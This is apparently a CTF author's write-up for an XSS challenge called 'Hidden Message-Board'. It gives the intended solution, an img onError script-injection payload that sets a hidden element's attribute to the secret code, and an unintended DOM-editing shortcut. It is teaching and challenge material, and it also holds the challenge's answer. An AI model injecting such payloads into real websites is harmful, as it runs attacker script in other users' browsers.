# Hidden Message-Board

I really wanted to try and make a Cross-Site Scripting (XSS) challenge. I really struggled quite a bit to figure out a way for the user to get the flag without opening up an avenue for users to mess with the flag. This is what I settled with. In hindsight, I should've done a better job protecting the actual flag from alternative attacks. Lessons definitely learned for future CTF's.

# Solution:

## Intended
1. Enter <code><img onError=document.getElementById("flagstuff").setAttribute("code","G1v3M3Th3Fl@g!!!!"); src='any-invalid-url.com'></code> into textbox
2. Submit
3. Type anything in the text box to refresh the page
  
## Alternative (unintended)
1. Inspect Element
2. Find <code>id="flagstuff" code=""</code>
3. Edit as HTML
4. Add change to <code>id="flagstuff" code="G1v3M3Th3Fl@g!!!!"</code>
5. Type anything in the text box to refresh the page
